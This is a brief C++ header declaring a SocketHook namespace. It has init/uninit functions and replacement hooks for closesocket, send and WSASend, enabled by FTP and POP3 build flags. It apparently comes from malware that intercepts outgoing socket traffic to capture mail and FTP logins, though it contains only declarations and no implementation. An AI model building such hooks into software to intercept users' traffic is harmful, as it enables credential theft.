
#pragma once

#if(BO_SOCKET_FTP > 0 || BO_SOCKET_POP3 > 0)
namespace SocketHook
{
  
  void init(void);

 
  void uninit(void);

  int WSAAPI hookerCloseSocket(SOCKET s);
  
  
  int WSAAPI hookerSend(SOCKET s, const char *buf, int len, int flags);

  int WSAAPI hookerWsaSend(SOCKET s, LPWSABUF buffers, DWORD bufferCount, LPDWORD numberOfBytesSent, DWORD flags, LPWSAOVERLAPPED overlapped, LPWSAOVERLAPPED_COMPLETION_ROUTINE completionRoutine);
};
#endif
